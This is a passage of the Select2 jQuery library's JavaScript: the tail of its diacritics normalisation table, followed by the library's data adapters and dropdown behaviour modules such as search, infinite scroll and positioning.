                "Ｔ": "T",
                "Ṫ": "T",
                "Ť": "T",
                "Ṭ": "T",
                "Ț": "T",
                "Ţ": "T",
                "Ṱ": "T",
                "Ṯ": "T",
                "Ŧ": "T",
                "Ƭ": "T",
                "Ʈ": "T",
                "Ⱦ": "T",
                "Ꞇ": "T",
                "Ꜩ": "TZ",
                "Ⓤ": "U",
                "Ｕ": "U",
                "Ù": "U",
                "Ú": "U",
                "Û": "U",
                "Ũ": "U",
                "Ṹ": "U",
                "Ū": "U",
                "Ṻ": "U",
                "Ŭ": "U",
                "Ü": "U",
                "Ǜ": "U",
                "Ǘ": "U",
                "Ǖ": "U",
                "Ǚ": "U",
                "Ủ": "U",
                "Ů": "U",
                "Ű": "U",
                "Ǔ": "U",
                "Ȕ": "U",
                "Ȗ": "U",
                "Ư": "U",
                "Ừ": "U",
                "Ứ": "U",
                "Ữ": "U",
                "Ử": "U",
                "Ự": "U",
                "Ụ": "U",
                "Ṳ": "U",
                "Ų": "U",
                "Ṷ": "U",
                "Ṵ": "U",
                "Ʉ": "U",
                "Ⓥ": "V",
                "Ｖ": "V",
                "Ṽ": "V",
                "Ṿ": "V",
                "Ʋ": "V",
                "Ꝟ": "V",
                "Ʌ": "V",
                "Ꝡ": "VY",
                "Ⓦ": "W",
                "Ｗ": "W",
                "Ẁ": "W",
                "Ẃ": "W",
                "Ŵ": "W",
                "Ẇ": "W",
                "Ẅ": "W",
                "Ẉ": "W",
                "Ⱳ": "W",
                "Ⓧ": "X",
                "Ｘ": "X",
                "Ẋ": "X",
                "Ẍ": "X",
                "Ⓨ": "Y",
                "Ｙ": "Y",
                "Ỳ": "Y",
                "Ý": "Y",
                "Ŷ": "Y",
                "Ỹ": "Y",
                "Ȳ": "Y",
                "Ẏ": "Y",
                "Ÿ": "Y",
                "Ỷ": "Y",
                "Ỵ": "Y",
                "Ƴ": "Y",
                "Ɏ": "Y",
                "Ỿ": "Y",
                "Ⓩ": "Z",
                "Ｚ": "Z",
                "Ź": "Z",
                "Ẑ": "Z",
                "Ż": "Z",
                "Ž": "Z",
                "Ẓ": "Z",
                "Ẕ": "Z",
                "Ƶ": "Z",
                "Ȥ": "Z",
                "Ɀ": "Z",
                "Ⱬ": "Z",
                "Ꝣ": "Z",
                "ⓐ": "a",
                "ａ": "a",
                "ẚ": "a",
                "à": "a",
                "á": "a",
                "â": "a",
                "ầ": "a",
                "ấ": "a",
                "ẫ": "a",
                "ẩ": "a",
                "ã": "a",
                "ā": "a",
                "ă": "a",
                "ằ": "a",
                "ắ": "a",
                "ẵ": "a",
                "ẳ": "a",
                "ȧ": "a",
                "ǡ": "a",
                "ä": "a",
                "ǟ": "a",
                "ả": "a",
                "å": "a",
                "ǻ": "a",
                "ǎ": "a",
                "ȁ": "a",
                "ȃ": "a",
                "ạ": "a",
                "ậ": "a",
                "ặ": "a",
                "ḁ": "a",
                "ą": "a",
                "ⱥ": "a",
                "ɐ": "a",
                "ꜳ": "aa",
                "æ": "ae",
                "ǽ": "ae",
                "ǣ": "ae",
                "ꜵ": "ao",
                "ꜷ": "au",
                "ꜹ": "av",
                "ꜻ": "av",
                "ꜽ": "ay",
                "ⓑ": "b",
                "ｂ": "b",
                "ḃ": "b",
                "ḅ": "b",
                "ḇ": "b",
                "ƀ": "b",
                "ƃ": "b",
                "ɓ": "b",
                "ⓒ": "c",
                "ｃ": "c",
                "ć": "c",
                "ĉ": "c",
                "ċ": "c",
                "č": "c",
                "ç": "c",
                "ḉ": "c",
                "ƈ": "c",
                "ȼ": "c",
                "ꜿ": "c",
                "ↄ": "c",
                "ⓓ": "d",
                "ｄ": "d",
                "ḋ": "d",
                "ď": "d",
                "ḍ": "d",
                "ḑ": "d",
                "ḓ": "d",
                "ḏ": "d",
                "đ": "d",
                "ƌ": "d",
                "ɖ": "d",
                "ɗ": "d",
                "ꝺ": "d",
                "ǳ": "dz",
                "ǆ": "dz",
                "ⓔ": "e",
                "ｅ": "e",
                "è": "e",
                "é": "e",
                "ê": "e",
                "ề": "e",
                "ế": "e",
                "ễ": "e",
                "ể": "e",
                "ẽ": "e",
                "ē": "e",
                "ḕ": "e",
                "ḗ": "e",
                "ĕ": "e",
                "ė": "e",
                "ë": "e",
                "ẻ": "e",
                "ě": "e",
                "ȅ": "e",
                "ȇ": "e",
                "ẹ": "e",
                "ệ": "e",
                "ȩ": "e",
                "ḝ": "e",
                "ę": "e",
                "ḙ": "e",
                "ḛ": "e",
                "ɇ": "e",
                "ɛ": "e",
                "ǝ": "e",
                "ⓕ": "f",
                "ｆ": "f",
                "ḟ": "f",
                "ƒ": "f",
                "ꝼ": "f",
                "ⓖ": "g",
                "ｇ": "g",
                "ǵ": "g",
                "ĝ": "g",
                "ḡ": "g",
                "ğ": "g",
                "ġ": "g",
                "ǧ": "g",
                "ģ": "g",
                "ǥ": "g",
                "ɠ": "g",
                "ꞡ": "g",
                "ᵹ": "g",
                "ꝿ": "g",
                "ⓗ": "h",
                "ｈ": "h",
                "ĥ": "h",
                "ḣ": "h",
                "ḧ": "h",
                "ȟ": "h",
                "ḥ": "h",
                "ḩ": "h",
                "ḫ": "h",
                "ẖ": "h",
                "ħ": "h",
                "ⱨ": "h",
                "ⱶ": "h",
                "ɥ": "h",
                "ƕ": "hv",
                "ⓘ": "i",
                "ｉ": "i",
                "ì": "i",
                "í": "i",
                "î": "i",
                "ĩ": "i",
                "ī": "i",
                "ĭ": "i",
                "ï": "i",
                "ḯ": "i",
                "ỉ": "i",
                "ǐ": "i",
                "ȉ": "i",
                "ȋ": "i",
                "ị": "i",
                "į": "i",
                "ḭ": "i",
                "ɨ": "i",
                "ı": "i",
                "ⓙ": "j",
                "ｊ": "j",
                "ĵ": "j",
                "ǰ": "j",
                "ɉ": "j",
                "ⓚ": "k",
                "ｋ": "k",
                "ḱ": "k",
                "ǩ": "k",
                "ḳ": "k",
                "ķ": "k",
                "ḵ": "k",
                "ƙ": "k",
                "ⱪ": "k",
                "ꝁ": "k",
                "ꝃ": "k",
                "ꝅ": "k",
                "ꞣ": "k",
                "ⓛ": "l",
                "ｌ": "l",
                "ŀ": "l",
                "ĺ": "l",
                "ľ": "l",
                "ḷ": "l",
                "ḹ": "l",
                "ļ": "l",
                "ḽ": "l",
                "ḻ": "l",
                "ſ": "l",
                "ł": "l",
                "ƚ": "l",
                "ɫ": "l",
                "ⱡ": "l",
                "ꝉ": "l",
                "ꞁ": "l",
                "ꝇ": "l",
                "ǉ": "lj",
                "ⓜ": "m",
                "ｍ": "m",
                "ḿ": "m",
                "ṁ": "m",
                "ṃ": "m",
                "ɱ": "m",
                "ɯ": "m",
                "ⓝ": "n",
                "ｎ": "n",
                "ǹ": "n",
                "ń": "n",
                "ñ": "n",
                "ṅ": "n",
                "ň": "n",
                "ṇ": "n",
                "ņ": "n",
                "ṋ": "n",
                "ṉ": "n",
                "ƞ": "n",
                "ɲ": "n",
                "ŉ": "n",
                "ꞑ": "n",
                "ꞥ": "n",
                "ǌ": "nj",
                "ⓞ": "o",
                "ｏ": "o",
                "ò": "o",
                "ó": "o",
                "ô": "o",
                "ồ": "o",
                "ố": "o",
                "ỗ": "o",
                "ổ": "o",
                "õ": "o",
                "ṍ": "o",
                "ȭ": "o",
                "ṏ": "o",
                "ō": "o",
                "ṑ": "o",
                "ṓ": "o",
                "ŏ": "o",
                "ȯ": "o",
                "ȱ": "o",
                "ö": "o",
                "ȫ": "o",
                "ỏ": "o",
                "ő": "o",
                "ǒ": "o",
                "ȍ": "o",
                "ȏ": "o",
                "ơ": "o",
                "ờ": "o",
                "ớ": "o",
                "ỡ": "o",
                "ở": "o",
                "ợ": "o",
                "ọ": "o",
                "ộ": "o",
                "ǫ": "o",
                "ǭ": "o",
                "ø": "o",
                "ǿ": "o",
                "ɔ": "o",
                "ꝋ": "o",
                "ꝍ": "o",
                "ɵ": "o",
                "ƣ": "oi",
                "ȣ": "ou",
                "ꝏ": "oo",
                "ⓟ": "p",
                "ｐ": "p",
                "ṕ": "p",
                "ṗ": "p",
                "ƥ": "p",
                "ᵽ": "p",
                "ꝑ": "p",
                "ꝓ": "p",
                "ꝕ": "p",
                "ⓠ": "q",
                "ｑ": "q",
                "ɋ": "q",
                "ꝗ": "q",
                "ꝙ": "q",
                "ⓡ": "r",
                "ｒ": "r",
                "ŕ": "r",
                "ṙ": "r",
                "ř": "r",
                "ȑ": "r",
                "ȓ": "r",
                "ṛ": "r",
                "ṝ": "r",
                "ŗ": "r",
                "ṟ": "r",
                "ɍ": "r",
                "ɽ": "r",
                "ꝛ": "r",
                "ꞧ": "r",
                "ꞃ": "r",
                "ⓢ": "s",
                "ｓ": "s",
                "ß": "s",
                "ś": "s",
                "ṥ": "s",
                "ŝ": "s",
                "ṡ": "s",
                "š": "s",
                "ṧ": "s",
                "ṣ": "s",
                "ṩ": "s",
                "ș": "s",
                "ş": "s",
                "ȿ": "s",
                "ꞩ": "s",
                "ꞅ": "s",
                "ẛ": "s",
                "ⓣ": "t",
                "ｔ": "t",
                "ṫ": "t",
                "ẗ": "t",
                "ť": "t",
                "ṭ": "t",
                "ț": "t",
                "ţ": "t",
                "ṱ": "t",
                "ṯ": "t",
                "ŧ": "t",
                "ƭ": "t",
                "ʈ": "t",
                "ⱦ": "t",
                "ꞇ": "t",
                "ꜩ": "tz",
                "ⓤ": "u",
                "ｕ": "u",
                "ù": "u",
                "ú": "u",
                "û": "u",
                "ũ": "u",
                "ṹ": "u",
                "ū": "u",
                "ṻ": "u",
                "ŭ": "u",
                "ü": "u",
                "ǜ": "u",
                "ǘ": "u",
                "ǖ": "u",
                "ǚ": "u",
                "ủ": "u",
                "ů": "u",
                "ű": "u",
                "ǔ": "u",
                "ȕ": "u",
                "ȗ": "u",
                "ư": "u",
                "ừ": "u",
                "ứ": "u",
                "ữ": "u",
                "ử": "u",
                "ự": "u",
                "ụ": "u",
                "ṳ": "u",
                "ų": "u",
                "ṷ": "u",
                "ṵ": "u",
                "ʉ": "u",
                "ⓥ": "v",
                "ｖ": "v",
                "ṽ": "v",
                "ṿ": "v",
                "ʋ": "v",
                "ꝟ": "v",
                "ʌ": "v",
                "ꝡ": "vy",
                "ⓦ": "w",
                "ｗ": "w",
                "ẁ": "w",
                "ẃ": "w",
                "ŵ": "w",
                "ẇ": "w",
                "ẅ": "w",
                "ẘ": "w",
                "ẉ": "w",
                "ⱳ": "w",
                "ⓧ": "x",
                "ｘ": "x",
                "ẋ": "x",
                "ẍ": "x",
                "ⓨ": "y",
                "ｙ": "y",
                "ỳ": "y",
                "ý": "y",
                "ŷ": "y",
                "ỹ": "y",
                "ȳ": "y",
                "ẏ": "y",
                "ÿ": "y",
                "ỷ": "y",
                "ẙ": "y",
                "ỵ": "y",
                "ƴ": "y",
                "ɏ": "y",
                "ỿ": "y",
                "ⓩ": "z",
                "ｚ": "z",
                "ź": "z",
                "ẑ": "z",
                "ż": "z",
                "ž": "z",
                "ẓ": "z",
                "ẕ": "z",
                "ƶ": "z",
                "ȥ": "z",
                "ɀ": "z",
                "ⱬ": "z",
                "ꝣ": "z",
                "Ά": "Α",
                "Έ": "Ε",
                "Ή": "Η",
                "Ί": "Ι",
                "Ϊ": "Ι",
                "Ό": "Ο",
                "Ύ": "Υ",
                "Ϋ": "Υ",
                "Ώ": "Ω",
                "ά": "α",
                "έ": "ε",
                "ή": "η",
                "ί": "ι",
                "ϊ": "ι",
                "ΐ": "ι",
                "ό": "ο",
                "ύ": "υ",
                "ϋ": "υ",
                "ΰ": "υ",
                "ω": "ω",
                "ς": "σ"
            }
        })), e.define("select2/data/base", ["../utils"], (function (t) {
            function e(t, i) {
                e.__super__.constructor.call(this)
            }

            return t.Extend(e, t.Observable), e.prototype.current = function (t) {
                throw new Error("The `current` method must be defined in child classes.")
            }, e.prototype.query = function (t, e) {
                throw new Error("The `query` method must be defined in child classes.")
            }, e.prototype.bind = function (t, e) {
            }, e.prototype.destroy = function () {
            }, e.prototype.generateResultId = function (e, i) {
                var n = e.id + "-result-";
                return (n += t.generateChars(4)) + (null != i.id ? "-" + i.id.toString() : "-" + t.generateChars(4))
            }, e
        })), e.define("select2/data/select", ["./base", "../utils", "jquery"], (function (t, e, i) {
            function n(t, e) {
                this.$element = t, this.options = e, n.__super__.constructor.call(this)
            }

            return e.Extend(n, t), n.prototype.current = function (t) {
                var e = [], n = this;
                this.$element.find(":selected").each((function () {
                    var t = i(this), o = n.item(t);
                    e.push(o)
                })), t(e)
            }, n.prototype.select = function (t) {
                var e = this;
                if (t.selected = !0, i(t.element).is("option")) return t.element.selected = !0, void this.$element.trigger("change");
                if (this.$element.prop("multiple")) this.current((function (n) {
                    var o = [];
                    (t = [t]).push.apply(t, n);
                    for (var s = 0; s < t.length; s++) {
                        var r = t[s].id;
                        -1 === i.inArray(r, o) && o.push(r)
                    }
                    e.$element.val(o), e.$element.trigger("change")
                })); else {
                    var n = t.id;
                    this.$element.val(n), this.$element.trigger("change")
                }
            }, n.prototype.unselect = function (t) {
                var e = this;
                if (this.$element.prop("multiple")) return t.selected = !1, i(t.element).is("option") ? (t.element.selected = !1, void this.$element.trigger("change")) : void this.current((function (n) {
                    for (var o = [], s = 0; s < n.length; s++) {
                        var r = n[s].id;
                        r !== t.id && -1 === i.inArray(r, o) && o.push(r)
                    }
                    e.$element.val(o), e.$element.trigger("change")
                }))
            }, n.prototype.bind = function (t, e) {
                var i = this;
                this.container = t, t.on("select", (function (t) {
                    i.select(t.data)
                })), t.on("unselect", (function (t) {
                    i.unselect(t.data)
                }))
            }, n.prototype.destroy = function () {
                this.$element.find("*").each((function () {
                    i.removeData(this, "data")
                }))
            }, n.prototype.query = function (t, e) {
                var n = [], o = this;
                this.$element.children().each((function () {
                    var e = i(this);
                    if (e.is("option") || e.is("optgroup")) {
                        var s = o.item(e), r = o.matches(t, s);
                        null !== r && n.push(r)
                    }
                })), e({results: n})
            }, n.prototype.addOptions = function (t) {
                e.appendMany(this.$element, t)
            }, n.prototype.option = function (t) {
                var e;
                t.children ? (e = document.createElement("optgroup")).label = t.text : void 0 !== (e = document.createElement("option")).textContent ? e.textContent = t.text : e.innerText = t.text, t.id && (e.value = t.id), t.disabled && (e.disabled = !0), t.selected && (e.selected = !0), t.title && (e.title = t.title);
                var n = i(e), o = this._normalizeItem(t);
                return o.element = e, i.data(e, "data", o), n
            }, n.prototype.item = function (t) {
                var e = {};
                if (null != (e = i.data(t[0], "data"))) return e;
                if (t.is("option")) e = {
                    id: t.val(),
                    text: t.text(),
                    disabled: t.prop("disabled"),
                    selected: t.prop("selected"),
                    title: t.prop("title")
                }; else if (t.is("optgroup")) {
                    e = {text: t.prop("label"), children: [], title: t.prop("title")};
                    for (var n = t.children("option"), o = [], s = 0; s < n.length; s++) {
                        var r = i(n[s]), a = this.item(r);
                        o.push(a)
                    }
                    e.children = o
                }
                return (e = this._normalizeItem(e)).element = t[0], i.data(t[0], "data", e), e
            }, n.prototype._normalizeItem = function (t) {
                i.isPlainObject(t) || (t = {id: t, text: t});
                return null != (t = i.extend({}, {text: ""}, t)).id && (t.id = t.id.toString()), null != t.text && (t.text = t.text.toString()), null == t._resultId && t.id && null != this.container && (t._resultId = this.generateResultId(this.container, t)), i.extend({}, {
                    selected: !1,
                    disabled: !1
                }, t)
            }, n.prototype.matches = function (t, e) {
                return this.options.get("matcher")(t, e)
            }, n
        })), e.define("select2/data/array", ["./select", "../utils", "jquery"], (function (t, e, i) {
            function n(t, e) {
                var i = e.get("data") || [];
                n.__super__.constructor.call(this, t, e), this.addOptions(this.convertToOptions(i))
            }

            return e.Extend(n, t), n.prototype.select = function (t) {
                var e = this.$element.find("option").filter((function (e, i) {
                    return i.value == t.id.toString()
                }));
                0 === e.length && (e = this.option(t), this.addOptions(e)), n.__super__.select.call(this, t)
            }, n.prototype.convertToOptions = function (t) {
                function n(t) {
                    return function () {
                        return i(this).val() == t.id
                    }
                }

                for (var o = this, s = this.$element.find("option"), r = s.map((function () {
                    return o.item(i(this)).id
                })).get(), a = [], l = 0; l < t.length; l++) {
                    var c = this._normalizeItem(t[l]);
                    if (i.inArray(c.id, r) >= 0) {
                        var d = s.filter(n(c)), u = this.item(d), h = i.extend(!0, {}, c, u), p = this.option(h);
                        d.replaceWith(p)
                    } else {
                        var f = this.option(c);
                        if (c.children) {
                            var g = this.convertToOptions(c.children);
                            e.appendMany(f, g)
                        }
                        a.push(f)
                    }
                }
                return a
            }, n
        })), e.define("select2/data/ajax", ["./array", "../utils", "jquery"], (function (t, e, i) {
            function n(t, e) {
                this.ajaxOptions = this._applyDefaults(e.get("ajax")), null != this.ajaxOptions.processResults && (this.processResults = this.ajaxOptions.processResults), n.__super__.constructor.call(this, t, e)
            }

            return e.Extend(n, t), n.prototype._applyDefaults = function (t) {
                var e = {
                    data: function (t) {
                        return i.extend({}, t, {q: t.term})
                    }, transport: function (t, e, n) {
                        var o = i.ajax(t);
                        return o.then(e), o.fail(n), o
                    }
                };
                return i.extend({}, e, t, !0)
            }, n.prototype.processResults = function (t) {
                return t
            }, n.prototype.query = function (t, e) {
                function n() {
                    var n = s.transport(s, (function (n) {
                        var s = o.processResults(n, t);
                        o.options.get("debug") && window.console && console.error && (s && s.results && i.isArray(s.results) || console.error("Select2: The AJAX results did not return an array in the `results` key of the response.")), e(s)
                    }), (function () {
                        o.trigger("results:message", {message: "errorLoading"})
                    }));
                    o._request = n
                }

                var o = this;
                null != this._request && (i.isFunction(this._request.abort) && this._request.abort(), this._request = null);
                var s = i.extend({type: "GET"}, this.ajaxOptions);
                "function" == typeof s.url && (s.url = s.url.call(this.$element, t)), "function" == typeof s.data && (s.data = s.data.call(this.$element, t)), this.ajaxOptions.delay && "" !== t.term ? (this._queryTimeout && window.clearTimeout(this._queryTimeout), this._queryTimeout = window.setTimeout(n, this.ajaxOptions.delay)) : n()
            }, n
        })), e.define("select2/data/tags", ["jquery"], (function (t) {
            function e(e, i, n) {
                var o = n.get("tags"), s = n.get("createTag");
                void 0 !== s && (this.createTag = s);
                var r = n.get("insertTag");
                if (void 0 !== r && (this.insertTag = r), e.call(this, i, n), t.isArray(o)) for (var a = 0; a < o.length; a++) {
                    var l = o[a], c = this._normalizeItem(l), d = this.option(c);
                    this.$element.append(d)
                }
            }

            return e.prototype.query = function (t, e, i) {
                var n = this;
                return this._removeOldTags(), null == e.term || null != e.page ? void t.call(this, e, i) : void t.call(this, e, (function t(o, s) {
                    for (var r = o.results, a = 0; a < r.length; a++) {
                        var l = r[a], c = null != l.children && !t({results: l.children}, !0);
                        if (l.text === e.term || c) return !s && (o.data = r, void i(o))
                    }
                    if (s) return !0;
                    var d = n.createTag(e);
                    if (null != d) {
                        var u = n.option(d);
                        u.attr("data-select2-tag", !0), n.addOptions([u]), n.insertTag(r, d)
                    }
                    o.results = r, i(o)
                }))
            }, e.prototype.createTag = function (e, i) {
                var n = t.trim(i.term);
                return "" === n ? null : {id: n, text: n}
            }, e.prototype.insertTag = function (t, e, i) {
                e.unshift(i)
            }, e.prototype._removeOldTags = function (e) {
                (this._lastTag, this.$element.find("option[data-select2-tag]")).each((function () {
                    this.selected || t(this).remove()
                }))
            }, e
        })), e.define("select2/data/tokenizer", ["jquery"], (function (t) {
            function e(t, e, i) {
                var n = i.get("tokenizer");
                void 0 !== n && (this.tokenizer = n), t.call(this, e, i)
            }

            return e.prototype.bind = function (t, e, i) {
                t.call(this, e, i), this.$search = e.dropdown.$search || e.selection.$search || i.find(".select2-search__field")
            }, e.prototype.query = function (t, e, i) {
                var n = this;
                e.term = e.term || "";
                var o = this.tokenizer(e, this.options, (function (t) {
                    n.trigger("select", {data: t})
                }));
                o.term !== e.term && (this.$search.length && (this.$search.val(o.term), this.$search.focus()), e.term = o.term), t.call(this, e, i)
            }, e.prototype.tokenizer = function (e, i, n, o) {
                for (var s = n.get("tokenSeparators") || [], r = i.term, a = 0, l = this.createTag || function (t) {
                    return {id: t.term, text: t.term}
                }; a < r.length;) {
                    var c = r[a];
                    if (-1 !== t.inArray(c, s)) {
                        var d = r.substr(0, a), u = l(t.extend({}, i, {term: d}));
                        null != u ? (o(u), r = r.substr(a + 1) || "", a = 0) : a++
                    } else a++
                }
                return {term: r}
            }, e
        })), e.define("select2/data/minimumInputLength", [], (function () {
            function t(t, e, i) {
                this.minimumInputLength = i.get("minimumInputLength"), t.call(this, e, i)
            }

            return t.prototype.query = function (t, e, i) {
                return e.term = e.term || "", e.term.length < this.minimumInputLength ? void this.trigger("results:message", {
                    message: "inputTooShort",
                    args: {minimum: this.minimumInputLength, input: e.term, params: e}
                }) : void t.call(this, e, i)
            }, t
        })), e.define("select2/data/maximumInputLength", [], (function () {
            function t(t, e, i) {
                this.maximumInputLength = i.get("maximumInputLength"), t.call(this, e, i)
            }

            return t.prototype.query = function (t, e, i) {
                return e.term = e.term || "", this.maximumInputLength > 0 && e.term.length > this.maximumInputLength ? void this.trigger("results:message", {
                    message: "inputTooLong",
                    args: {maximum: this.maximumInputLength, input: e.term, params: e}
                }) : void t.call(this, e, i)
            }, t
        })), e.define("select2/data/maximumSelectionLength", [], (function () {
            function t(t, e, i) {
                this.maximumSelectionLength = i.get("maximumSelectionLength"), t.call(this, e, i)
            }

            return t.prototype.query = function (t, e, i) {
                var n = this;
                this.current((function (o) {
                    var s = null != o ? o.length : 0;
                    return n.maximumSelectionLength > 0 && s >= n.maximumSelectionLength ? void n.trigger("results:message", {
                        message: "maximumSelected",
                        args: {maximum: n.maximumSelectionLength}
                    }) : void t.call(n, e, i)
                }))
            }, t
        })), e.define("select2/dropdown", ["jquery", "./utils"], (function (t, e) {
            function i(t, e) {
                this.$element = t, this.options = e, i.__super__.constructor.call(this)
            }

            return e.Extend(i, e.Observable), i.prototype.render = function () {
                var e = t('<span class="select2-dropdown"><span class="select2-results"></span></span>');
                return e.attr("dir", this.options.get("dir")), this.$dropdown = e, e
            }, i.prototype.bind = function () {
            }, i.prototype.position = function (t, e) {
            }, i.prototype.destroy = function () {
                this.$dropdown.remove()
            }, i
        })), e.define("select2/dropdown/search", ["jquery", "../utils"], (function (t, e) {
            function i() {
            }

            return i.prototype.render = function (e) {
                var i = e.call(this),
                    n = t('<span class="select2-search select2-search--dropdown"><input class="select2-search__field" type="search" tabindex="-1" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" role="textbox" /></span>');
                return this.$searchContainer = n, this.$search = n.find("input"), i.prepend(n), i
            }, i.prototype.bind = function (e, i, n) {
                var o = this;
                e.call(this, i, n), this.$search.on("keydown", (function (t) {
                    o.trigger("keypress", t), o._keyUpPrevented = t.isDefaultPrevented()
                })), this.$search.on("input", (function (e) {
                    t(this).off("keyup")
                })), this.$search.on("keyup input", (function (t) {
                    o.handleSearch(t)
                })), i.on("open", (function () {
                    o.$search.attr("tabindex", 0), o.$search.focus(), window.setTimeout((function () {
                        o.$search.focus()
                    }), 0)
                })), i.on("close", (function () {
                    o.$search.attr("tabindex", -1), o.$search.val("")
                })), i.on("results:all", (function (t) {
                    null != t.query.term && "" !== t.query.term || (o.showSearch(t) ? o.$searchContainer.removeClass("select2-search--hide") : o.$searchContainer.addClass("select2-search--hide"))
                }))
            }, i.prototype.handleSearch = function (t) {
                if (!this._keyUpPrevented) {
                    var e = this.$search.val();
                    this.trigger("query", {term: e})
                }
                this._keyUpPrevented = !1
            }, i.prototype.showSearch = function (t, e) {
                return !0
            }, i
        })), e.define("select2/dropdown/hidePlaceholder", [], (function () {
            function t(t, e, i, n) {
                this.placeholder = this.normalizePlaceholder(i.get("placeholder")), t.call(this, e, i, n)
            }

            return t.prototype.append = function (t, e) {
                e.results = this.removePlaceholder(e.results), t.call(this, e)
            }, t.prototype.normalizePlaceholder = function (t, e) {
                return "string" == typeof e && (e = {id: "", text: e}), e
            }, t.prototype.removePlaceholder = function (t, e) {
                for (var i = e.slice(0), n = e.length - 1; n >= 0; n--) {
                    var o = e[n];
                    this.placeholder.id === o.id && i.splice(n, 1)
                }
                return i
            }, t
        })), e.define("select2/dropdown/infiniteScroll", ["jquery"], (function (t) {
            function e(t, e, i, n) {
                this.lastParams = {}, t.call(this, e, i, n), this.$loadingMore = this.createLoadingMore(), this.loading = !1
            }

            return e.prototype.append = function (t, e) {
                this.$loadingMore.remove(), this.loading = !1, t.call(this, e), this.showLoadingMore(e) && this.$results.append(this.$loadingMore)
            }, e.prototype.bind = function (e, i, n) {
                var o = this;
                e.call(this, i, n), i.on("query", (function (t) {
                    o.lastParams = t, o.loading = !0
                })), i.on("query:append", (function (t) {
                    o.lastParams = t, o.loading = !0
                })), this.$results.on("scroll", (function () {
                    var e = t.contains(document.documentElement, o.$loadingMore[0]);
                    !o.loading && e && (o.$results.offset().top + o.$results.outerHeight(!1) + 50 >= o.$loadingMore.offset().top + o.$loadingMore.outerHeight(!1) && o.loadMore())
                }))
            }, e.prototype.loadMore = function () {
                this.loading = !0;
                var e = t.extend({}, {page: 1}, this.lastParams);
                e.page++, this.trigger("query:append", e)
            }, e.prototype.showLoadingMore = function (t, e) {
                return e.pagination && e.pagination.more
            }, e.prototype.createLoadingMore = function () {
                var e = t('<li class="select2-results__option select2-results__option--load-more"role="treeitem" aria-disabled="true"></li>'),
                    i = this.options.get("translations").get("loadingMore");
                return e.html(i(this.lastParams)), e
            }, e
        })), e.define("select2/dropdown/attachBody", ["jquery", "../utils"], (function (t, e) {
            function i(e, i, n) {
                this.$dropdownParent = n.get("dropdownParent") || t(document.body), e.call(this, i, n)
            }

            return i.prototype.bind = function (t, e, i) {
                var n = this, o = !1;
                t.call(this, e, i), e.on("open", (function () {
                    n._showDropdown(), n._attachPositioningHandler(e), o || (o = !0, e.on("results:all", (function () {
                        n._positionDropdown(), n._resizeDropdown()
                    })), e.on("results:append", (function () {
                        n._positionDropdown(), n._resizeDropdown()
                    })))
                })), e.on("close", (function () {
                    n._hideDropdown(), n._detachPositioningHandler(e)
                })), this.$dropdownContainer.on("mousedown", (function (t) {
                    t.stopPropagation()
                }))
            }, i.prototype.destroy = function (t) {
                t.call(this), this.$dropdownContainer.remove()
            }, i.prototype.position = function (t, e, i) {
                e.attr("class", i.attr("class")), e.removeClass("select2"), e.addClass("select2-container--open"), e.css({
                    position: "absolute",
                    top: -999999
                }), this.$container = i
            }, i.prototype.render = function (e) {
                var i = t("<span></span>"), n = e.call(this);
                return i.append(n), this.$dropdownContainer = i, i
            }, i.prototype._hideDropdown = function (t) {
                this.$dropdownContainer.detach()
            }, i.prototype._attachPositioningHandler = function (i, n) {
                var o = this, s = "scroll.select2." + n.id, r = "resize.select2." + n.id,
                    a = "orientationchange.select2." + n.id, l = this.$container.parents().filter(e.hasScroll);
                l.each((function () {
                    t(this).data("select2-scroll-position", {x: t(this).scrollLeft(), y: t(this).scrollTop()})
                })), l.on(s, (function (e) {
                    var i = t(this).data("select2-scroll-position");
                    t(this).scrollTop(i.y)
                })), t(window).on(s + " " + r + " " + a, (function (t) {
                    o._positionDropdown(), o._resizeDropdown()
                }))
            }, i.prototype._detachPositioningHandler = function (i, n) {
                var o = "scroll.select2." + n.id, s = "resize.select2." + n.id, r = "orientationchange.select2." + n.id;
                this.$container.parents().filter(e.hasScroll).off(o), t(window).off(o + " " + s + " " + r)
            }, i.prototype._positionDropdown = function () {
                var e = t(window), i = this.$dropdown.hasClass("select2-dropdown--above"),
                    n = this.$dropdown.hasClass("select2-dropdown--below"), o = null, s = this.$container.offset();
                s.bottom = s.top + this.$container.outerHeight(!1);
                var r = {height: this.$container.outerHeight(!1)};
                r.top = s.top, r.bottom = s.top + r.height;
                var a = this.$dropdown.outerHeight(!1), l = e.scrollTop(), c = e.scrollTop() + e.height(),
                    d = l < s.top - a, u = c > s.bottom + a, h = {left: s.left, top: r.bottom},
                    p = this.$dropdownParent;
                "static" === p.css("position") && (p = p.offsetParent());
                var f = p.offset();
                h.top -= f.top, h.left -= f.left, i || n || (o = "below"), u || !d || i ? !d && u && i && (o = "below") : o = "above", ("above" == o || i && "below" !== o) && (h.top = r.top - a), null != o && (this.$dropdown.removeClass("select2-dropdown--below select2-dropdown--above").addClass("select2-dropdown--" + o), this.$container.removeClass("select2-container--below select2-container--above").addClass("select2-container--" + o)), this.$dropdownContainer.css(h)
            }, i.prototype._resizeDropdown = function () {
                var t = {width: this.$container.outerWidth(!1) + "px"};
                this.options.get("dropdownAutoWidth") && (t.minWidth = t.width, t.width = "auto"), this.$dropdown.css(t)
            }, i.prototype._showDropdown = function (t) {
                this.$dropdownContainer.appendTo(this.$dropdownParent), this._positionDropdown(), this._resizeDropdown()
            }, i
        })), e.define("select2/dropdown/minimumResultsForSearch", [], (function () {
            function t(e) {
                for (var i = 0, n = 0; n < e.length; n++) {
                    var o = e[n];
                    o.children ? i += t(o.children) : i++
                }
                return i
            }

            function e(t, e, i, n) {
                this.minimumResultsForSearch = i.get("minimumResultsForSearch"), this.minimumResultsForSearch < 0 && (this.minimumResultsForSearch = 1 / 0), t.call(this, e, i, n)
            }

            return e.prototype.showSearch = function (e, i) {
                return !(t(i.data.results) < this.minimumResultsForSearch) && e.call(this, i)
            }, e
        })), e.define("select2/dropdown/selectOnClose", [], (function () {
            function t() {
            }

            return t.prototype.bind = function (t, e, i) {
                var n = this;
                t.call(this, e, i), e.on("close", (function () {
                    n._handleSelectOnClose()
                }))
            }, t.prototype._handleSelectOnClose = function () {
                var t = this.getHighlightedResults();
                if (!(t.length < 1)) {
                    var e = t.data("data");
                    null != e.element && e.element.selected || null == e.element && e.selected || this.trigger("select", {data: e})
                }
            }, t
        })), e.define("select2/dropdown/closeOnSelect", [], (function () {
            function t() {
            }

            return t.prototype.bind = function (t, e, i) {
                var n = this;
                t.call(this, e, i), e.on("select", (function (t) {
                    n._selectTriggered(t)
                })), e.on("unselect", (function (t) {
